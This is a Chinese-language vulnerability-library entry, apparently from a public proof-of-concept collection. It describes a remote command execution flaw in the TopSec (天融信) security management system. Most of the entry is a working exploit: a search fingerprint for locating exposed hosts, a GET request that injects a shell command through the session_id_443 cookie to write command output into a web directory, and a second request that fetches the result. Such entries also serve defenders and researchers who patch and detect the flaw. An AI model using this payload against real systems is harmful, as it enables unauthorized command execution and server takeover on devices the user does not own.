---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 天融信TOPSEC Cookie 远程命令执行漏洞

# 一、漏洞简介
<font style="color:rgb(77, 77, 77);">天融信TopSec安全管理系统 Cookie字段存在远程命令执行漏洞，通过该漏洞，攻击者可通过构造恶意字符串，执行任意系统命令，从而拿下服务器权限。</font>

# <font style="color:rgb(77, 77, 77);">二、影响版本</font>
+ <font style="color:rgb(77, 77, 77);">天融信TopSec安全管理系统</font>

# <font style="color:rgb(77, 77, 77);">三、资产测绘</font>
+ hunter`web.body="/cgi/maincgi.cgi?Url=VerifyCode"`
+ 特征


# 四、漏洞复现
```java
GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: 
Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/tt.txt;
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```


获取命令执行结果

```java
GET /site/image/tt.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```


[test_qrcode_b-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222234675-5ae23a8d-103c-4fab-bc8f-c12a5b7ca4fe.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ff91c9eyvw89wgfb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
